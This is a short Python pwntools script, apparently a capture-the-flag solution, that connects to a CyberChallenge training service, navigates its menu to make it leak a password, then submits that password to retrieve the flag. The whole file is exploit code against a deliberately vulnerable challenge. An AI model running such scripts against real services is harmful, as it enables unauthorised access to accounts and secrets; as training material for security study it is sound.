from pwn import *

HOST = "cyberchallenge.disi.unitn.it"
PORT = 9205
r = remote(HOST, PORT)

r.recvuntil(b"7. Exit\n")
r.sendline(b"1")
r.recvuntil(b"7. Exit\n")

r.sendline(b"3")
r.recvuntil(b"7. Exit\n")

r.sendline(b"4")
r.recvuntil(b"password: ")
password= r.recvline().strip().split(b"\n")[0]
print(password)
r.recvuntil(b"7. Exit\n")

r.sendline(b"2")
r.recvuntil(b"Password: ")
r.sendline(password)

print(r.recvuntil(b"}").decode(errors="ignore"))
